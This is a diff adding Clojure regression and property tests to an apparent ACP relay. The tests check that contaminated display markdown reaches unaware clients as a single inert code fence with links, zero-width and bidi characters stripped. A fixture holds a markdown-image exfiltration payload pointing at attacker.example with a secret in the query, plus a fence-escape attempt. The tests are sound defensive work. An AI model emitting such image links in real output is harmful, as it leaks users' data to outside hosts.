@@ -391,3 +391,43 @@
             (is doc)
             (is (= [] (:labels (core/trusted-version (state) "doc" (:path doc)))))
             (is (some #(= "chat" (get-in % [:data :via])) (filter #(= "label/trusted" (:type %)) (log/read-events (data)))))))))))
+
+;; --- a display's text for a client that knows nothing of displays
+
+(defn- display-line [title body]
+  (json/generate-string {:jsonrpc "2.0" :method "session/update"
+                         :params {:sessionId "s" :update {:sessionUpdate "tool_call_update" :toolCallId "c"
+                                                          :content [{:type "content" :content {:type "text" :text "closed answer"}}
+                                                                    {:type "content" :content {:type "text" :text (str title "\n\n" body)
+                                                                                               :_meta {"relay/display" {:title title :body body :labels ["contaminated"]}}}}]}}}))
+
+(deftest a-display-reaches-other-clients-inert
+  ;; Regression (cross-cutting review): the display's markdown went to any
+  ;; ACP client as it was, so a client that knows nothing of displays
+  ;; fetched a remote image in a reader's answer.
+  (let [line (display-line "Receipt" "![receipt](https://attacker.example/pixel?secret=abc)​ ``` x")
+        out (json/parse-string (acp/with-inert-displays line))
+        [plain shown] (get-in out ["params" "update" "content"])
+        text (get-in shown ["content" "text"])]
+    (is (= "closed answer" (get-in plain ["content" "text"])) "other blocks are as they were")
+    (is (str/starts-with? text "````text\n"))
+    (is (not (str/includes? text "https://")))
+    (is (not (str/includes? text "attacker.example")))
+    (is (not (str/includes? text "​")))
+    (is (= "![receipt](https://attacker.example/pixel?secret=abc)​ ``` x"
+           (get-in shown ["content" "_meta" "relay/display" "body"])) "the display itself is unchanged")
+    (is (nil? (acp/with-inert-displays "{\"method\":\"session/update\",\"params\":{}}")))))
+
+(deftest inert-text-is-one-fence-with-nothing-live
+  (check 200
+         (prop/for-all [parts (gen/vector (gen/elements ["a" " " "\n" "`" "```" "````" "." "https://" "HTTP://"
+                                                         "evil" "example.com" "​" "‮" "![x](" ")"]))]
+           (let [out (acp/inert (apply str parts))
+                 lines (str/split out #"\n" -1)
+                 fence (subs (first lines) 0 (- (count (first lines)) 4))]
+             (and (re-matches #"`{3,}" fence)
+                  (= fence (last lines))
+                  (not-any? #(str/starts-with? (str/triml %) fence) (butlast (rest lines)))
+                  (not (re-find #"(?i)https?://" out))
+                  (not (str/includes? out "example.com"))
+                  (not (re-find #"[​‮]" out)))))))
